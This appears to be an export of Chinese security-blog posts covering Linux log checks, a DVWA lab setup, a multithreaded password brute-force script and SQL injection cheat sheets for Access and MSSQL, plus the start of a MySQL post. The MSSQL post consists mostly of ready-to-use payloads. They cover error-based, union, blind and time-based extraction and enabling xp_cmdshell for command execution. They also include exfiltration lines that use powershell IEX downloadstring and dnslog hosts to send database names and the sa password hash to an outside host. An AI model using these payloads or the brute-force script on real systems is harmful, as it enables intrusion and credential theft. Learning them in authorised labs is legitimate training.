记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中     查看ssh日志：  cat /var/log/auth.log  登录成功记录  cat /var/log/auth.log 登录错误日志  cat /var/log/auth.log  查看ftp日志：  `cat /var/log/auth.log\n\n\nLinux排查主要难点在于系统不同，日志位置也有所区别，且每个日志位置都需要自己寻找，使用命令查看。\nLinux常见日志位置\n\n\n日志\n说明\n\n\n\n/var/log/boot.log\n记录了系统在引导过程中发生的事件，就是Linux系统开机自检过程显示的信息，记录系统启动的过程。可以通过该日志，查看服务启动成功或者失败。如果系统启动之后有什么异常也可以查看该日志\n\n\n/var/log/lastlog\n记录最后一次用户成功登录的时间、登录IP等信息     查看的某系统用户最后一次登录的记录，一些系统用户从来不登录最后一次就是Neverloggedin。  不用直接查看该日志文件，通过命令：lastlog\n\n\n/var/log/messages\n记录Linux操作系统常见的系统和服务错误信息     系统默认开启的日志记录，记录的内核消息、各种服务的公共消息，报错信息等。  可以通过该日志查看系统服务的运行情况。从该文件可以看出任何入侵企图或成功的入侵。具体内容包括：时间、地点、任务、事件等等。  对于这个文件，我们日常只需要关注一些错误和告警信息。命令：`egrep-ri ‘error\n\n\n*/var/log/secure\nLinux系统安全日志，记录用户和工作组变化情况、用户登录认证情况     一般用来记录安全相关的信息，记录最多的是哪些用户登录服务器的相关日志。例如：sshd会将所有信息（其中包括失败登录）记录在这里  如果该文件很大，说明有人在破解你的root密码     查看所有登陆失败用户及其登录次数：  `grep  “Failed password” /var/log/secure\n\n\n/var/log/btmp\n记录Linux登录失败的用户、时间及远程IP地址     记录Linux登陆失败的用户、时间以及远程IP地址  该文件是一个二进制保存的文件，直接使用lastb命令查看。  如果该日志文件过大，可以清空该文件\n\n\n/var/log/wtmp\n该日志文件永久记录每个登录、注销及系统的启动、停机的时间     wtmp日志文件永久记录每个用户登录和退出、数据交换、关机及重启的信息。  wtmp文件被命令last和ac使用。  last命令：访问wtmp文件，显示自从文件第一次创建以来所有登陆过的用户  ac命令：统计登录的总时长acroot：显示root用户登陆的总时长\n\n\n/var/log/utmp\n该日志文件记录有关当前登录的每个用户的信息          记录有关当前登录用户的信息在文件utmp中，utmp文件可以使用命令查询。如：who、w等  who命令：访问utmp记录，显示当前正在登录的用户信息。  w：与who命令相似，但显示的信息更加详细\n\n\n","categories":["安服"],"tags":["入侵排查"]},{"title":"搭建综合靶场","url":"/article/%E6%90%AD%E5%BB%BA%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/","content":"一、简介渗透学习中经常会用到到靶场，这里综合了几个常用的靶场，分享一下。\n二、搭建搭建在centos中，主要是对DVWA做配置\n安装Apache（httpd）yum install httpd httpd-devel httpd-manual httpd-tools\n\n启动apache并设置开机自启\nsystemctl start httpd  \t\t# 开启apachesystemctl enable httpd  \t# 设置开机自启systemctl status httpd  \t# 查看apache状态\n\n安装Mysqlyum install mariadb-server\n\n启动Mysql并设置开机自启\nsystemctl start mariadb \t \t# 开启mariadbsystemctl enable mariadb \t \t# 设置开机自启systemctl status mariadb  \t\t# 查看mariadb状态\n\n配置Mysql数据库\n初始化mysql数据库（全部回车确认）\nmysql_secure_installation\n\n设置mysql密码（非操作系统密码）\n配置\nmysql -uroot -pcreate database dvwa;\t\t\t# 创建数据库grant all privileges on *.* to dvwa@localhost identified by &#x27;dvwa&#x27;;\t\t# 创建用户\n\n安装PHP(php-fpm php-mysqlnd不装，其他均可)\nyum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap\n\n重启apache使php生效（php不是独立软件，依附apache）\nsystemctl restart httpd\n\n配置\nvim /etc/php.ini修改allow_url_include=Off为allow_url_include=On\n\n安装DVWAwget https://github.com/ethicalhack3r/DVWA/archive/master.zip\n\n解压并复制到/var/www/html目录\n配置\ncd /var/www/html/config/cp config.inc.php.dist config.inc.php\t\t# /DVWA/config目录下vim config.inc.php\t\t\t\t# 修改用户密码为数据库用户密码（root:xxx）$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;chown -R apache:apache /var/www/html/vim /etc/php.ini\t\t# 修改apache配置文件（文件上传会用到）allow_url_include = Onsystemctl restart httpd\t\t\t\t\t\t# 重启apache\n\n三、访问环境http://虚拟机IP\n\nsql-lab和dvwa都需要初始化\nDVWA密码 admin:password\n四、下载https://www.zerochen.top/download/Env/a.gz.tar\n","categories":["环境搭建"],"tags":["综合靶场"]},{"title":"Python之爆破脚本","url":"/article/Python%E4%B9%8B%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC/","content":"一、简介利用爆破功能脚本，熟悉参数、进度条模块的使用。\n二、模块介绍参数模块\ngetopt函数\nimport sys, getoptdef main(argv):   inputfile = &#x27;&#x27;   outputfile = &#x27;&#x27;   try:      opts, args = getopt.getopt(argv,&quot;hi:o:&quot;,[&quot;ifile=&quot;,&quot;ofile=&quot;])   except getopt.GetoptError:      print (&#x27;test.py -i &lt;inputfile&gt; -o &lt;outputfile&gt;&#x27;)      sys.exit(2)   for opt, arg in opts:      if opt == &#x27;-h&#x27;:         print (&#x27;test.py -i &lt;inputfile&gt; -o &lt;outputfile&gt;&#x27;)         sys.exit()      elif opt in (&quot;-i&quot;, &quot;--ifile&quot;):         inputfile = arg      elif opt in (&quot;-o&quot;, &quot;--ofile&quot;):         outputfile = arg   print (&#x27;输入的文件为：&#x27;, inputfile)   print (&#x27;输出的文件为：&#x27;, outputfile)if __name__ == &quot;__main__&quot;:   main(sys.argv[1:])\n\n说明：\n\n\n\n语句\n说明\n\n\n\nargv[1:]\n不限制参数数量（&gt;1）\n\n\ntry:  &#9;pass  except  getopt.GetoptError:  &#9;pass\n异常捕捉，参数不存在时报错，提示正确的用法\n\n\nopts,args=getopt.getopt(argv,”hi:o”,[“ifile=”,”ofile=”])\n定义短标签（-）和长标签（–）  短标签:表示必须有此参数，长标签=同理  注意！经实验得知，:、=号使用时，只要会被用到传参的参数，都必须要加，否则会接收不到变量值。而不是说明文档中让人产生歧义的说法，让人误以为是可有可无的参数都不用加:、=\n\n\nfor opt, arg in opts:     &#9;if opt == ‘-h’:       &#9;&#9;print (&#39;test.py -i &lt;inputfile&gt;  -o &lt;outputfile&gt;&#39;)       &#9;&#9;sys.exit()     &#9;elif opt in (“-i”,  “–ifile”):       &#9;&#9;inputfile = arg\nfor循环判断匹配参数  ，opt为参数，arg为参数值\n\n\n进度条模块\nrich\nfrom rich.progress import Progress\t\t# 模块导入with Progress() as progress:\t\t\t# 模块初始化，需要嵌套在主进程函数之外，total标表示总任务数        task = progress.add_task(&#x27;[green]Downloading...&#x27;, total=1000)    while not progress.finished:\t\t\t# 任务函数用使用，更新进度条，advance每次更新的长度        progress.update(task, advance=5)\n\n\n\n三、代码\n&#x27;&#x27;&#x27;    描述：爆破脚本，用户名+密码排列组合方式，推荐精简名字典        支持参数、进度条、Ctrl C功能    version：2.0    author：chen    date：2021-08-13&#x27;&#x27;&#x27;import sysimport threadingimport requestsimport getoptimport queuefrom rich.progress import Progress# 参数处理def para(argv):    global dicts    dicts = &#123;&#x27;url&#x27;: &#x27;&#x27;, &#x27;thread&#x27;: &#x27;&#x27;, &#x27;delay&#x27;: &#x27;&#x27;, &#x27;file_name&#x27;: &#x27;&#x27;, &#x27;file_pass&#x27;: &#x27;&#x27;&#125;    try:        opts, args = getopt.getopt(argv, &quot;u:hT:&quot;, [&quot;url=&quot;, &quot;fname=&quot;, &quot;fpass=&quot;, &quot;delay=&quot;])    except getopt.GetoptError:        print(&quot;python brute2.0.py -u http:test.com --fname C:\\\\Users\\\\Chen\\\\Desktop\\\\Temp\\\\user.txt --fpass C:\\\\Users\\\\Chen\\\\Desktop\\\\Temp\\\\pass.txt -T 100&quot;)    for opt, arg in opts:        if opt == &#x27;-h&#x27;:            print(&quot;python brute2.0.py -u http:test.com --fname C:\\\\Users\\\\Chen\\\\Desktop\\\\Temp\\\\user.txt --fpass C:\\\\Users\\\\Chen\\\\Desktop\\\\Temp\\\\pass.txt -T 100&quot;)            exit()        elif opt in (&quot;-u&quot;, &quot;--url&quot;):            dicts[&#x27;url&#x27;] = arg            # print(&#x27;url:&#x27;, dicts[&#x27;url&#x27;])        elif opt == &#x27;-T&#x27;:            dicts[&#x27;thread&#x27;] = arg            # print(&#x27;线程:&#x27;, dicts[&#x27;thread&#x27;])        elif opt == &#x27;--delay&#x27;:            dicts[&#x27;delay&#x27;] = arg            # print(&#x27;发包延时:%sms&#x27; % dicts[&#x27;delay&#x27;])        elif opt == &#x27;--fname&#x27;:            dicts[&#x27;file_name&#x27;] = arg            # print(&#x27;用户名字典:&#x27;, dicts[&#x27;file_name&#x27;])        elif opt == &#x27;--fpass&#x27;:            dicts[&#x27;file_pass&#x27;] = arg            # print(&#x27;密码字典:&#x27;, dicts[&#x27;file_pass&#x27;])# 初始化字典队列def init(fname, fpass, q):    # 排列组合模式生成字典队列，两个都过大时会导致初始化很慢。    # 建议精简用户名字典，合适的密码字典    print(&#x27;正在初始化字典队列...&#x27;)    for i in open(fname):        for j in open(fpass):            # 以列表形式写入队列            q.put([i.strip(), j.strip()])    print(&#x27;字典队列初始化完毕！&#x27;)def run(q, BarId, url):    while not q.empty():        que = q.get()        # 爆破目标的核心数据包，根据实际情况更改        data = &#123;            &quot;log&quot;: que[0],            &quot;pwd&quot;: que[1],            &quot;wp-submit&quot;: &quot;%E7%99%BB%E5%BD%95&quot;        &#125;        # 代理，自定义        proxy = &#123;            &#x27;http&#x27;: &#x27;http://127.0.0.1:7890&#x27;,            &#x27;https&#x27;: &#x27;https://127.0.0.1:7890&#x27;        &#125;        # 发包，禁止302跳转，否则抓不到302返回状态码        # 可取消代理        rep = requests.post(url=url, data=data, allow_redirects=False)        if rep.status_code == 302:            print(&#x27;\\033[32m爆破成功! &#123;0&#125;:&#123;1&#125;\\033[0m&#x27; .format(que[0], que[1]))            # 爆破成功进度条拉满，触发主进程守护，结束进程            progress.update(BarId, advance=999999999)        # 更新进度条        progress.update(BarId, advance=1)if __name__ == &#x27;__main__&#x27;:    dicts = &#123;&#125;    q = queue.Queue()    # 初始化参数    para(sys.argv[1:])    # 初始化队列    url = dicts[&#x27;url&#x27;]    delay = dicts[&#x27;delay&#x27;]    init(dicts[&#x27;file_name&#x27;], dicts[&#x27;file_pass&#x27;], q)    # 进度条初始化    with Progress() as progress:        BarId = progress.add_task(&#x27;[green]Status:&#x27;, total=q.qsize())        # 多线程数量        for i in range(int(dicts[&#x27;thread&#x27;])):            # 设置主线程守护            t = threading.Thread(target=run, args=[q, BarId, url, delay], daemon=True)            t.start()        # 进度条结束，终止主程序运行        # 解决Ctrl+C终止程序 和 程序自动结束的问题        while not progress.finished:            pass\n\n\n\n4、下载\nhttps://www.zerochen.top/download/Burst/Burst2.0.py\n","categories":["Python"],"tags":["爆破"]},{"title":"信息收集","url":"/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","content":"\n\n\n步骤\n说明\n\n\n\n前期交互\n渗透人员+甲方客户-&gt;签授权合同  规定攻击方式 ： &#9;apt、钓鱼、近源、web、ddos、禁止延时盲注等  规定渗透范围 ： &#9;公司范围、目标范围  规定渗透时间 ： &#9;攻防演练：7天 长期渗透：2-3年  规定法律法规相关 规定信息泄露相关\n\n\n信息搜集\n大型企业 ：股权信息搜集 中型企业 ：域名 小型企业 ：IP  信息收集方式 主动收集：与目标交互，会记录自己的操作信息 被动收集：不与目标交互，搜索引擎等工具  谷歌语法 site:找到与指定网站有联系的URL inurl：将返回url中含有关键词的网页 allinurl：与inurl类似，可以指定多个词 intext：寻找正文中含有关键字的网页 allintext：寻找正文中的多个关键字 intitle：寻找标题中含有关键字的网页 allintitle：寻找标题中的多个关键字 filetype：指定访问的文件类型  符号使用 1、精确搜索： 给关键词加上双引号实现精确匹配双引号内的字符 2、通配符： 谷歌的通配符是星号&quot;*&quot;，必须在精确搜索符双引号内部使用。用通配符代替关键词或短语中无法确定的字词 3、点号匹配任意字符： 点号&quot;.&quot;匹配的是匹配某个字符，不是字、短语等内容。 4、基本搜索符号约束： 加号&quot;+&quot;用于强制搜索，即必须包含加号后的内容。一般与精确搜索符一起应用。关键词前加&quot;-&quot;减号,要求搜索结果中包含关键词,但不包含减号后的关键词，用关于搜索结果的筛选。 5、数字范围：用两个点号&quot;..&quot;表示一个数字范围。一般应用于日期、货币、尺寸、重量、高度等范围的搜索如：手机2000..3000元，注意“3000”与“元”之间必须有空格6、布尔逻辑：或，符号`”\n\n\n威胁建模\n建立excle表格，进行信息整理，初步猜测可能存在的漏洞点 域名、IP、端口、中间件等\n\n\n渗透测试\ntop10漏洞、cms漏洞等 注意： 挖src时，只允许到此截断，且webshell只允许输出提示语句（echo ‘ok’等）； xss只允许使用console.log(/xss/)等 …\n\n\n后渗透测试\n有指向性的获取目标数据（狭义上：内网渗透）\n\n\n报告截断\n撰写报告\n\n\n其他：\n注册网站信息查询\nhttps://www.reg007.com/\n网站监测\nhttps://anquan.baidu.com/product/secindex?industry=total\nDNS信息\nhttps://dnsdb.io/zh-cn/\nwhoami信息\nhttp://whatweb.bugscaner.com/\n网站指纹信息\nhttps://www.godeye.vip/\n","categories":["Web渗透"],"tags":["信息收集"]},{"title":"Access注入","url":"/article/Access%E6%B3%A8%E5%85%A5/","content":"端口：无\n没有数据库概念，一个文件就是一个库\n通常是asp+access搭配，只存在联合查询和bool盲注两种注入方式\nAccess数据库结构：\n表名-&gt;列名-&gt;内容数据\nasp、aspx通常为mssql或access数据库\n\n\n\n判断\n结果\n\n\n\nand exists (select * from msysobjects)&gt;0\naccess\n\n\n?id=1&#39; and exists (select * from sysobjects)&gt;0 –\nmssql\n\n\nand sleep(3)\nmysql\n\n\n注入步骤\n\n\n方法\n语句\n\n\n\n判断数据库类型\nand exists (select * from msysobjects)&gt;0 返回正为access数据库 ?id=1&#39; and exists (select * from sysobjects)&gt;0 – 返回正常是mssql数据库\n\n\n判断注入点\nand 1=1 and 1=0\n\n\n判断列数\norder by\n\n\n猜解表名、列名\n1、union猜解 猜表名 ?id=1 union select 1,2,3,4 from 表名 猜列名 ?id=1 union select 1,列名,3,4 from 表名 2、exists猜解 猜表名 ?id=1 and exists(select * from 表名) 或 ?id=1 and 0 &lt; &gt; (select count(*) from 表名) 猜列名 ?id=1 and exists(select 列名 from 表名)\n\n\n暴数据\n1、盲注 猜长度： ?id=1 and (select top 1 len(列名) from 表名)=猜解的长度 猜内容： ?id=1 and (select top 1 asc(mid(列名,1,1)) from 表名)&gt;猜解的ascii码值  2、移位溢出 union select 1,2,3,4,5,6,7,table.* from 表名; union select 1,2,3,4,5,6,table.*,7 from 表名; union select 1,2,3,4,5,table.*,6,7 from 表名;\n\n\n","categories":["Web渗透"],"tags":["Access"]},{"title":"MSSQL注入","url":"/article/MSSQL%E6%B3%A8%E5%85%A5/","content":"端口：1433\nMaster数据库：\n控制SQL Server的所有方面，这个数据库中包括所有的配置信息、用户登录信息、当前正在服务器中运行的过程的信息等\n管理员账号：sa\n一、基本语句\n\n\n操作\n语句\n\n\n\n创建数据库\ncreate databases [dbname]\n\n\n删除数据库\ndrop database [dbname]\n\n\n创建新表\ncreate table [tablename] (name char(10),age tinyint,sex int)\n\n\n删除新表\ndrop table [tablename]\n\n\n向表中插入内容\ninsert into tablename values(value1,value2)\n\n\n删除内容\ndelete from [tablename] where 范围\n\n\n查找\nselect * from [tablename] where field1=&quot;&quot;\n\n\n判断是否为mssql数据库 (返回正常是mssql，不正常为access)\n?id=1&#x27; and  1&lt;(select count(*) from sysobjects) --  ?id=1&#x27; and  exists (select * from sysobjects) --  \n\n二、报错注入\n\n\n操作\n语句\n\n\n\n判断注入点\n1’ and 1=1 返回正常 1’ and 1=0 返回错误 利用数字和字符不能比较（字符发生强制类型转换错误） 注：=号可换为&lt;、&gt;，低版本mssql使用=可能会报错\n\n\n显示数据库版本\n?id=1&#39; and 1&lt;(select @@version) --\n\n\n显示当前数据库名字\n?id=1&#39; and 1&lt;(select db_name()) --\n\n\n显示当前数据库连接的用户\n?id=1&#39; and 1&lt;(select user_name()) --\n\n\n判断当前数据库连接用户的权限 页面正常为sysadmin权限\n?id=1&#39; and 1=(select is_srvrolemember(&#39;sysadmin&#39;)) -- 权限有： sysadmin、serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin 注： and 1=(select is_member(&#39;db_owner&#39;)) -- 判断是否为db_owner权限，可通过备份方式向网站写文件\n\n\n获取数据库数量\n当数据类型为int类型时，无法触发强制类型转换，因此需要结合convert和cast as ?id=1&#39; and 1&lt;char(126)%2b(select cast(count(*) as nvarchar(4000)) from master.dbo.sysdatabases)%2bchar(126) --  使用convert ?id=1&#39; and 1&lt;convert(int, char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from master.dbo.sysdatabases)%2bchar(126)) -- 或使用二分法 ?id=1&#39; and 1&lt;(select count(db_name) from master.dbo.sysdatabases) --\n\n\n获取数据库名称\n1&#39; and 1&lt;(select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases)) -- 第二个top 1中的1为查第几个表，意为取前几个，这里使用了逻辑嵌套法，下同\n\n\n判断数据库的表数量\n?id=1&#39; and 1&lt;char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from information_schema.tables)%2bchar(126) --  ?id=1&#39; and 1&lt;convert(int, char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from information_schema.tables)%2bchar(126)) --  二分法 ?id=1&#39; and 1&lt;(select count(table_name) from information_schema.tables) --\n\n\n获取表名称\n?id=1&#39; and 1&lt;(select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables)) --\n\n\n获取列的数量\n?id=1 and 1&lt;char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from information_schema.columns where table_name=&#39;tbname&#39;)%2bchar(126)--  ?id=1 and 1&lt;convert(int,char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from information_schema.columns where table_name=&#39;tbname&#39;)%2bchar(126)) --  二分法 ?id=1&#39; and 1&lt;(select count(column_name) from information_schema.columns where table_name = &#39;tbname&#39;) --\n\n\n获取列名\n?id=1&#39; and 1&lt;(select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39;)) --\n\n\n获取数据数量\n?id=1 and 1&lt;char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from tbname..users)%2bchar(126) --  ?id=1 and 1&lt;convert(int,char(126)%2b(select top 1 cast(count(*) as nvarchar(4000)) from tbname..users)%2bchar(126)) --  二分法 ?id=1&#39; and 1&lt;(select count(username) from tbname..users) --\n\n\n获取数据值\n?id=1&#39; and 1&lt;(select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)) --\n\n\n三、union联合查询\n\n\n方法\n语句\n\n\n\n判断列数\n?id=1&#39; order by 3 -- 注： mssql union select 要求前后数据类型保持一致1、用null代替显示位 2、带个替换null，确定数据类型\n\n\n判断显示位\n?id=-1&#39; union select 1,2,3 -- ?id=1&#39; union select null,null,null -- （判断时不要用此句，无显示）\n\n\n获取数据库版本\n?id=-1&#39; union select 1,@@version,3 --\n\n\n获取当前数据库名称\n?id=-1&#39; union select 1,db_name(),3 --\n\n\n获取数据库数量\n?id=-1&#39; union select 1,(select count(*) from master.dbo.sysdatabases),3 --\n\n\n获取数据库名称\n?id=-1&#39; union select 1,db_name(1),3 -- db_name()表示当前数据库，db_name(1)表示第一个数据库  或 ?id=-1&#39; union select top 1 1,name,3 from master.dbo.sysdatabases where name not in (select top 1 name from master.dbo.sysdatabases) --\n\n\n获取表数量\n?id=-1&#39; union select top 1 1,count(table_name),3 from information_schema.tables --\n\n\n获取表名称\n显示当前数据库下的表名 ?id=-1&#39; union select top 1 1,table_name,3 from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables) --  显示指定数据库下的表名 ?id=-1&#39; union select top 1 1,table_name,3 from information_schema.tables where table_name not in (select top 1 table_name from dbname.information_schema.tables) --\n\n\n获取列数量\n?id=-1&#39; union select top 1 1,count(column_name),3 from information_schema.columns --  获取指定表中的字段数量 ?id=-1&#39; union select top 1 1,count(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --\n\n\n获取列名\n?id=-1&#39; union select top 1 1,table_name,3 from information_schema.columns where table_name not in (select top 0 table_name from information_schema.tables) --指定表获取字段 ?id=-1&#39; union select top 1 column_name,2 from information_schema.columns where table_name=&#39;users&#39; and column_name not in (select top 0 column_name FROM information_schema.columns where table_name = &#39;users&#39;)) --\n\n\n获取数据数量\n?id=-1&#39; union select top 1 1,count(username),3 from test..users --\n\n\n获取数据值\n?id=-1&#39; union select top 1 username from test..users where username not in (select top 0 username from test..users) --\n\n\n四、Bool盲注（二分法）\n\n\n方法\n语句\n\n\n\n判断\n?id=1&#39; and 1=1 – ?id=1&#39; and 1=0 --\n\n\n判断数据库版本长度\n?id=1&#39; and 1&lt;len(@@version)--\n\n\n判断数据库版本名称\n?id=1&#39; and 1&lt;ascii(substring(@@version,1,1)) --\n\n\n判断当前数据库长度\n?id=1&#39; and 1&lt;len(db_name()) --\n\n\n判断当前数据库名称\n?id=1&#39; and 1&lt;ascii(substring(db_name(),1,1)) --\n\n\n判断数据库数量\n?id=1&#39; and 1&lt;(select count(*) from master.dbo.sysdatabases) --\n\n\n逐个判断数据库长度\n?id=1&#39; and 1&lt;len((select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases))) --\n\n\n逐个判断数据库名称\n?id=1&#39; and 1&lt;ascii(substring((select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases)),1,1)) --\n\n\n判断表数量\n?id=1&#39; and 1&lt;(select count(table_name) from information_schema.tables) --\n\n\n逐个判断表长\n?id=1&#39; and 1&lt;len((select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables))) --\n\n\n逐个判断表名\n?id=1&#39; and 1&lt;ascii(substring((select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables)),1,1)) --\n\n\n判断列数\n?id=1&#39; and 1&lt;(select count(column_name) from information_schema.columns where table_name=&#39;tbname&#39;) --\n\n\n逐个判断列的长度\n?id=1&#39; and 1&lt;len((select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39;))) --\n\n\n逐个判断列名\n?id=1&#39; and 1&lt;ascii(substring((select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39;)),1,1)) --\n\n\n判断数据数量\n?id=1&#39; and 1&lt;(select count(username) from dbname..tbname) --\n\n\n逐个判断数据长度\n?id=1&#39; and 1&lt;len((select top 1 username from tbname..users where username not in (select top 0 username from tbname..users))) --\n\n\n逐个判断数据值\n?id=1&#39; and 1&lt;ascii(substring((select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)),1,1)) --\n\n\n五、时间延时盲注\n\n\n方法\n语句\n\n\n\n判断数据库版本长度\n?id=1&#39; if(len(@@version)&gt;1) waitfor delay &#39;0:0:3&#39; --\n\n\n判断数据库版本名\n?id=1&#39; if(ascii(substring(@@version),1,1)&gt;1) waitfor delay &#39;0:0:3&#39; --\n\n\n判断当前数据库长度\n?id=1&#39; if(len(db_name())&gt;1) waitfor delay &#39;0:0:3&#39; --\n\n\n判断当前数据库名称\n?id=1&#39; if(ascii(db_name())&gt;1) waitfor delay &#39;0:0:3&#39; --\n\n\n判断数据库数量\n?id=1&#39; if((select count(*) from master.dbo.sysdatabases)&gt;1) waitfor delay &#39;0:0:3&#39;--\n\n\n逐个判断数据库长度\n?id=1&#39; if(len((select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases)))&gt;1) waitfor delay &#39;0:0:3&#39; --\n\n\n逐个判断数据库名\n?id=1&#39; if(ascii(substring((select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases)),1,1))&gt;1) waitfor delay &#39;0:0:3&#39; --\n\n\n判断表数量\n?id=1&#39; if((select count(table_name) from information_schema.tables)&gt;1) waitfor delay &#39;0:0:3&#39;--\n\n\n逐个判断表长度\n?id=1&#39; if((select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables))&gt;1) waitfor delay &#39;0:0:3&#39;--\n\n\n逐个判断表名\n?id=1&#39; if(ascii(substring((select top 1 table_name from information_schema.tables where table_name not in (select top 1 table_name from information_schema.tables)),1,1))&gt;1) waitfor delay &#39;0:0:3&#39;--\n\n\n判断列数\n?id=1&#39; if((select count(column_name) from information_schema.columns where table_name=&#39;tbname&#39;)&gt;1) waitfor delay &#39;0:0:3&#39;--\n\n\n逐个判断列长\n?id=1&#39; if((select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#39;tbname&#39;))&gt;1) waitfor delay &#39;0:0:3&#39;--\n\n\n逐个判断列名\n?id=1&#39; if(ascii(substring((select top 1 table_name from information_schema.columns where column_name not in (select top 1 column_name from information_schema.columns)),1,1))&gt;1) waitfor delay &#39;0:0:3&#39;--\n\n\n判断数据数量\n?id=1&#39; if((select count(username) from tbname..users)&gt;1) waitfor delay &#39;0:0:3&#39; --\n\n\n逐个判断数据长度\n?id=1&#39; if(len((select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)))&gt;1) waitfor delay &#39;0:0:3&#39; --\n\n\n逐个判断数据值\n?id=1&#39; if(ascii(substring((select top 1 username from tbname..users where username not in (select top 0 username from tbname..users)),1,1))&gt;1) waitfor delay &#39;0:0:3&#39;--\n\n\n六、命令执行xp_cmdshell 默认关闭状态/管理员才可以开启\nEXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;RECONFIGURE;\n\n开启xp_cmdshell功能\n?id=1&#x27;; EXEC sp_configure &#x27;show advanced options&#x27;, 1;--?id=1&#x27;; RECONFIGURE;--?id=1&#x27;; EXEC sp_configure &#x27;xp_cmdshell&#x27;,1--?id=1&#x27;; RECONFIGURE--\n\n验证xp_cmdshell功能\n?id=1&#x27;; exec master..xp_cmdshell &#x27;ping -n 10 127.0.0.1&#x27; --\n\n用sql注入，来获取命令执行结果\n1、创建一个表，再把命令执行的结果，写入到表中。\n`?id=1&#x27;; create table sqldata(result VARCHAR(8000)); --`\n\n2、执行命令，并且把结果写入表中\n\n\n\n方法\n语句\n\n\n\n直接写入\n?id=1&#39;;INSERT INTO sqldata (result) EXEC master..xp_cmdshell &#39;net user&#39;--\n\n\n转换一下\n?id=1&#39;;DECLARE @adqa VARCHAR(8000);SET @adqa=0x6970636F6E666967202F616C6C;INSERT INTO sqldata(result) EXEC master..xp_cmdshell @adqa--\n\n\n七、DNS外带\n\n\n方法\n语句\n\n\n\n字符型外带–指定ip端口\n?id=1;DECLARE @a varchar(8000);SET @a=(SELECT TOP 1 master.dbo.fn_varbintohexstr(CONVERT(varbinary,name)) from Master.dbo.SysDatabases);exec(&#39;master..xp_cmdshell &quot;powershell IEX (new-object net.webclient).downloadstring(&quot;http://172.16.12.187:9008/?data=&#39;%2b @a %2b&#39; &quot;)&quot;&#39; ) --\n\n\n数字型外带–指定ip端口\n?id=1;DECLARE @a VARCHAR(8000);SET @a=(SELECT TOP 1 substring(@@version,1,35));exec(&#39;master..xp_cmdshell &quot;powershell IEX (new-object net.webclient).downloadstring(&quot;http://172.16.12.187:9008/?data=&#39;%2b @a %2b&#39; &quot;)&quot;&#39; ) --\n\n\n字符型外带–dnslog平台***\n?id=1&#39;;declare @a varchar(1024);set @a=db_name();exec(&#39;master..xp_dirtree &quot;//&#39;%2B @a %2B&#39;.dnslog.io&quot;&#39;)--\n\n\n数字型外带–dnslog平台\n?id=1; declare @a varchar(1024);set @a=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name=&#39;sa&#39;); exec(&#39;master..xp_cmdshell &quot;ping -n 2&#39; %2b @a %2b &#39;.dnslog.com&#39; &quot;)--\n\n\nhttp外带需要监听http端口（python -m http.server 9008）\n","categories":["Web渗透"],"tags":["MSSQL"]},{"title":"Mysql注入","url":"/article/Mysql%E6%B3%A8%E5%85%A5/","content":"端口：3306\n一、SQL注入产生原因1、不当的类型处理\n2、不安全的数据库配置\n3、不合理的查询集处理\n4、不当的错误处理\n5、转义字符处理不合适\n6、多个提交处理不当\n二、SQL注入关键条件1、用户能控制输入的内容\n2、Web应用能把用户输入的内容带入到数据库中执行\nSQL注入分类\n\n\n\n分类\n说明\n\n\n\n根据请求方式分类 （判断注入工具：Burpsuite等）\nGET方式请求注入 POST方式请求注入\n\n\n根据注入点参数分类 （判断手法：’、”、\\）\n字符型注入 整数型注入 搜索型注入（%’and ‘%’=’ 闭合%）\n\n\n根据SQL注入点反馈类型分类（重点） （判断注入payload）\nunion类型 基于错误显示 布尔类型 基于时间 其他类型\n\n\n根据Web应用的数据库类型分类 （判断注入语句）\nMySQL SQLServer Oracle 